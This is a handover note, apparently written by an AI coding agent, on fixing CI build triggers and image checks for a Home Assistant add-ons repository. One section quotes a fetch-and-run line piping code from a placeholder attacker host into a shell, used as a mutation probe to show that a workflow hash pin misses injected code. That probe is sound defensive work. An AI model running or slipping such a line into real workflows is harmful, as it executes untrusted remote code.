# Handover — CI/CD trigger-gap batch `260909-rli`

**Written:** 2026-09-09, end of session. **HEAD:** `3cc13c2`, in sync with `origin/main` (ahead 0, behind 0).
**Working tree:** clean. `make lint` exit 0. All CI green on origin.

Resume with `/gsd-quick-batch --resume 260909-rli`.

---

## 1. What was fixed, and why it mattered

Two scheduled workflows — `auto-update.yml` (cron 06:00 UTC) and `base-image-update.yml` (cron 07:00 UTC)
— commit and push version bumps to `main` using the default `GITHUB_TOKEN`. **GitHub creates no workflow
runs for such events**, so `build-<addon>.yml` (`push` to main, `paths: <addon>/**`) never fired for them.

Since seven of nine add-ons now declare an `image:` key, the HA Supervisor *pulls* instead of building
locally — so every nightly bump left a store entry whose ghcr image was never built. Not a three-minute
window: permanent, until a human happened to push something under that directory.

Measured evidence (do not re-derive):

- `d3682f6` ("chore(meridian): update to 1.68.0", 2026-09-09 11:05 UTC) → **zero** `build-meridian` runs
- base-image commits `aaf6084` + `08dee0b` (2026-06-17) → **zero** runs for either sha, ever
- `amd64-meridian:1.68.0-0` measured **HTTP 404** while `meridian/config.yaml` already advertised it

**End-to-end proof that the fix works**, observed 2026-09-09 20:56 UTC: `Auto Update` bumped authentik to
`2026.8.2` and meridian to `1.69.0`, pushed, and **dispatched both builds** (`event=workflow_dispatch`).
Both builds succeeded; ghcr answers **HTTP 200** for `amd64-authentik:2026.8.2-0` and
`amd64-meridian:1.69.0-0`. Zero tags created, so `--no-tag` holds.

Side effect worth knowing: **authentik now has a ghcr image for the first time**, built from the Dockerfile
repaired earlier the same day. Its deferred `image:` key is therefore unblocked (see §2.4).

## 2. Open work, in the order I would do it

### 2.1 BLOCKER-ish: the pre-push hook now blocks a human push after every nightly bump

This is a regression **we introduced** in item `rll`. `--no-tag` stopped `auto-update.yml` from creating
`<addon>/v<version>` tags, but `internal/check-version-tags.sh` (the local pre-push hook) still demands
one for every add-on not on `LOCAL_BUILD_ADDONS` (currently just `iac-runner`).

Consequence: after each nightly bump, the next human push touching that add-on is refused until someone
tags by hand. It happened twice in this session; both tags were created manually
(`authentik/v2026.8.2-0`, `meridian/v1.69.0-0`) and pushed.

`rll`'s plan argued "no live consumer" because no CI job runs the hook. That was true and still wrong: the
hook does not consume the tag for a build, it **blocks a human**. Neither the plan, the plan-checker, nor
I saw that consumer role.

The hook's own stated rationale is now **doubly false**, and both halves were disproved in this session:

```
"The build workflow for authentik triggers on a '<addon>/v*' tag push"
   → false: authentik's tags: trigger is commented out (6 of 9 are)
"Without the tag ... the Docker image doesn't exist → 404 on update"
   → false: the dispatch builds it; measured HTTP 200
```

Options, my recommendation last:

1. Keep tagging in auto-update (revert `--no-tag`) — but then the off-by-one tags return (§3.2).
2. Add every auto-updated add-on to `LOCAL_BUILD_ADDONS` — wrong, they are pull add-ons, the name would lie.
3. **Rework the hook's requirement.** Builds now come from the dispatch, and the Stage-3 guard verifies four
   times daily that every advertised image exists. The tag's remaining value is as a release marker, and a
   release marker must not block a push. Either drop the requirement or downgrade it to a warning.

Note item `rln` (§2.3) already plans to rewrite this hook's *header comment*, so coordinate.

### 2.2 Verify item `rlm` (Stage 5, docs) — executed and pushed, never independently verified

Commit `833c176` (rebased; originally `0b1a00c`), 222 lines changed across `.github/RELEASE.md` (189→264)
and `docs/AUTO_UPDATE_GUIDE.md` (160→231). Its executor reported 102 green gates and one prettier reflow
iteration to convergence, but no verifier has checked that the new statements are **true** rather than
merely changed — which is the whole point of an item whose purpose is removing false claims.

It is `pending` in `BATCH.json`, so `--resume` will pick it up. Verify, then
`quick-batch complete --quick-id 260909-rlm --commit 833c176`.

### 2.3 Item `rln` (Stage 6): one `build.yml` replacing the nine `build-<addon>.yml`

Plan is written, reviewed and revised: `.planning/quick/stage-6-depends-on-stage-1-it-rewrites-internal-dispatch-bui/260909-rln-PLAN.md`
(1591 lines, 3 tasks, 20 paths). **Two cross-wave blockers were already found and fixed** in revision —
do not re-litigate them, but do re-measure its baselines, because `rlm` has since landed:

- `G3-7` originally pinned `internal/update-version.py`'s AST hash, which `rll` moves. Replaced with scoped
  invariants (argparse surface + `create_and_push_tag` signature + `py_compile`) rather than a re-derived hash.
- `G3-8` (repo-wide `grep` for `.github/workflows/build-` must be 0) was unachievable because `rlm` *plants*
  two new such references. `docs/AUTO_UPDATE_GUIDE.md` was added to `rln`'s files and an action item covers
  RELEASE.md's `## Auto-update path`.

**This is the highest-risk item in the batch**: a mistake breaks all nine builds simultaneously where today
it breaks one. Its chosen validation path (`D-03`) is a **dispatch-only first landing** — `act` and a test
branch are *structurally* unusable, because `workflow_dispatch` is only dispatchable for workflows on the
default branch and the only branch trigger would push real images to GHCR. That buys revertibility, not
validation; the mandatory post-merge dispatch proof is a `<success_criteria>` bullet.

Two decisions already recorded in the plan: tag triggers are dropped entirely (a `*/v*` trigger would
produce **green no-op runs** — on a tag ref `github.event.before` is all-zeros, the derivation falls back to
a single-commit diff, and in the documented release flow that commit is the pre-bump one), and RELEASE.md's
per-caller trigger table becomes a two-column `Supervisor image source` table.

Expected side effect, already disclosed in three places: `org.opencontainers.image.description` changes for
8 add-ons, because `addon-description` starts coming from `config.yaml` and 8 of 9 callers have drifted.
That is the fix, not a regression — `config.yaml` is what the store shows users.

### 2.4 Add the `image:` key to authentik and iac-runner

Both now have ghcr images, so the reference resolves. Verify anonymously first (§4). This was deliberately
deferred all session because the key would have been an unpullable reference.

### 2.5 Eight open ledger entries

`gsd-tools windows status`. Each is a measured finding, not a guess:

| # | Where | What |
|---|---|---|
| 2 | `CLAUDE.md:80` | Documents `yq eval --unsafe`; the installed `yq` is python-yq 4.1.2 with **no `eval` subcommand**. CI is fine (mikefarah/yq). |
| 3 | `lint.yml:94` | The shell-lint step ends in `\|\| echo "No shell scripts to check"`, so it **can never fail**. Repo-wide strict shellcheck exits 1 today with 22 pre-existing findings, so removing the `\|\|` turns CI red — clear the findings first. |
| 5 | `auto-update.yml` | That a live run creates no tag: over-broad, the *mechanism* was proven; only the end-to-end run is unreachable. Narrow it. |
| 6 | `base-image-update.yml` | Whether the two workflows queue — **now closed in practice**, observed live (`Base Image Update` sat `pending` while `Auto Update` ran). Can be marked fixed. |
| 7 | `auto-update.yml` | The `GATE-T1-14` supersession. |
| 8 | `verify-image-availability.yml:1` | The `if: failure()` HA-webhook leg has never executed; run `34402464619` was green so notify was correctly skipped. Needs a genuinely red run. |
| 9 | `260909-rll-PLAN.md:191` | **The leaky gate window** — see §3.1. Free fix available. |
| 10 | `auto-update.yml:114` | The bot produces `CHANGELOG.md` commits that fail `make lint`: it runs prettier "so lint.yml does not reject the commit", but prettier does not fix bare URLs and **markdownlint MD034** is what rejects them. Recurs every authentik release; hand-fixed at least twice. |

## 3. Non-obvious knowledge — do not re-derive, do not contradict

### 3.1 Recomputing a hash proves a pin is correct; only mutation proves it catches

`rll` superseded `rlj`'s whole-loop sha256 with a narrower triple. The first plan-checker recomputed all the
hashes, they matched, and it certified the replacement "strictly stronger". **A verifier then disproved that
with a mutation probe**: `curl -s https://evil.example/x | sh` injected into the 9-line unpinned window
(`auto-update.yml` 115-123, of which only one line is the intended edit) passes *every* replacement gate,
while `rlj`'s original pin caught it. The wording is corrected in both the plan and the SUMMARY so it cannot
harden into fact. Free fix: end Region A at the `--check-release` comment **inclusive**.

I propagated the false "strictly stronger" claim to two agents before it was disproved. Treat any
"stronger/weaker" claim about a gate as unproven until something has been mutated.

### 3.2 The tag off-by-one is in the documented MANUAL procedure, not the bot

`RELEASE.md` step 1 tags before step 2 commits, so **15 of 40** `<addon>/v*` tags point at a tree whose
`build.yaml` VERSION differs; 25 are correct. Do not overstate. The decisive example is
`terraform-bridge/v0.2.0 → 0.1.0`, because terraform-bridge has **no `.upstream.yaml`** — which proves the
bot is not the cause. Also `authentik/v2026.8.1 → 2026.8.0`, `meridian/v1.59.0 → 1.58.3`.

Say "an older version", not "the previous version": `meridian/v1.64.0` → tree `1.62.7`, and both
`v1.67.0-0` and `v1.68.0-0` → `1.66.0`. I over-generalised this as "off by two"; it is add-on dependent.

### 3.3 The shallow-clone trap in the Stage-3 guard

In a `--depth 1` clone `git log -S` does **not** "find nothing" — the grafted commit has no parent, so it
reports the *identical HEAD timestamp for every add-on*. At a 42-minute-old HEAD every add-on falls inside
the 45-minute grace window, all get skipped, and the guard exits 0 having sent no probe at all. At a
63-minute-old HEAD the same code and input give the correct verdict. **Identical input, opposite outcome,
decided only by the clock** — which is why the refusal is deterministic and `fetch-depth: 0` is mandatory,
not an optimisation.

### 3.4 The guard must read no registry credential — a correctness property, not hygiene

An authenticated probe returns 200 for an image only pullable *with* credentials, which is exactly what the
Supervisor cannot do. A token would make the guard certify a broken add-on. The workflow declares no
`packages:` scope and the script reads only `GITHUB_ACTIONS`. Do not "improve reliability" by adding one.

### 3.5 ghcr has three states, and the 403 is at the token endpoint

`token 200 + manifest 200` = ok. `token 200 + manifest 404` = version never published. `token 403/401` = not
anonymously pullable, **ambiguous** between missing and private — ghcr does not distinguish them for
anonymous callers, so no message may claim to know which.

### 3.6 The recurring plan defect in this batch: a gate that rejects CORRECT work

Seven instances were caught across the five plans. The shape: a gate negative-greps a literal that the same
action *mandates a comment about*. Also seen: `-eq 1` counts broken by mandated explanatory comments;
`yaml.safe_load` parsing a workflow's `on:` key as the boolean `True` (so any `d['on']` gate rejects correct
work); `grep -c '⚠️'` failing because the repo's glyph carries VS16 (U+FE0F). Standard remedy: strip
comments before asserting, or assert the *expression form* (`${{ vars.`) rather than the bare token.

### 3.7 Cross-wave staleness

Every baseline measured at planning time is stale by the time a later wave runs. `rln` pinned hashes that
`rll` and `rlm` move; `rlm`'s executor correctly corrected four of its own plan's facts for the same reason;
`rll`'s anchors had shifted 89 → 105 → 123 after `rlj`. **Re-measure anchors before editing; never trust a
line number from a plan.**

### 3.8 Operational gotchas

- `pretty-format-json` reformats staged JSON and aborts the commit once — re-stage and re-commit.
- `.prettierignore` excludes all of `.planning/`; files **outside** it are still reflowed
  (`proseWrap: always`, `printWidth: 120`) and `markdownlint` enforces 120 chars as an **error**.
- `py_compile` leaves `internal/__pycache__/*.pyc` containing pre-edit text, and `grep -rn` counts a binary
  match as a line. Exclude `__pycache__` or clean it before any repo-wide grep.
- Worktrees need `HEAD == origin/HEAD`, so **commit and push before dispatching an isolated executor** —
  otherwise `worktree.base-check` degrades to sequential, and untracked plan files do not exist in a worktree.
- An isolated executor's SUMMARY lives only inside its worktree. **Copy it out before cleanup.**
- `gsd-tools windows fixed <id>` takes only the id; passing `--reason` returns `ok: true` and silently
  writes nothing.

## 4. Useful commands

```bash
# batch state
python3 -c "import json;j=json.load(open('.planning/quick-batches/260909-rli/BATCH.json'));[print(i['quick_id'],i['status'],i['wave']) for i in j['items']]"

# the guard, all three directions
./internal/verify-image-availability.sh --self-test
./internal/verify-image-availability.sh --dry-run          # expect exactly 8 lines
./internal/verify-image-availability.sh --grace-minutes 0  # full scan, no grace

# the dispatch script without dispatching
DRY_RUN=1 ./internal/dispatch-builds.sh meridian nonexistent-addon

# anonymous ghcr check for one add-on (the Supervisor's own path)
img=akentner/homeassistant-addons/amd64-meridian
tok=$(curl -s "https://ghcr.io/token?scope=repository:$img:pull&service=ghcr.io" | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $tok" \
  -H 'Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.v2+json' \
  "https://ghcr.io/v2/$img/manifests/1.69.0-0"

# the tag audit behind §3.2
for t in $(git tag -l '*/v*'); do a=${t%%/*}; v=${t#*/v}; \
  bv=$(git show "$(git rev-list -n1 "$t"):$a/build.yaml" 2>/dev/null | grep -E '^\s+VERSION:' | head -1 | sed -E 's/.*VERSION:\s*"?([^"]*)"?.*/\1/'); \
  [ -n "$bv" ] && case "$v" in "$bv"|"$bv"-*) ;; *) echo "$t tag=$v tree=$bv";; esac; done

# actionlint in both enforced versions (binaries may still be in the scratchpad)
pre-commit run actionlint --all-files   # pinned v1.7.3
# latest: scripts/download-actionlint.bash, as lint.yml:60-66 does
```

## 5. Where things are

- Batch manifest: `.planning/quick-batches/260909-rli/BATCH.json`
- Per-item artifacts: `.planning/quick/stage-{1-2,3,4,5,6}-*/` — PLAN + SUMMARY + VERIFICATION each,
  except `rlm` (no VERIFICATION yet) and `rln` (plan only)
- Approved plan for the whole change: `~/.claude/plans/zazzy-dreaming-matsumoto.md`
- Ledger: `.planning/WINDOWS.md` (prettier-ignored; the fenced JSON block is the source of truth, the table
  is generated and must not be hand-edited)
- Prior art consulted: `alexbelgium/hassio-addons` — `.github/workflows/onpush_builder.yaml` is the model
  for `rln`. Its updater is an **HA add-on** pushing with a personal token, which is why it never hit this
  bug; that architecture was considered and rejected (a push-capable PAT in Home Assistant moves the trust
  boundary).
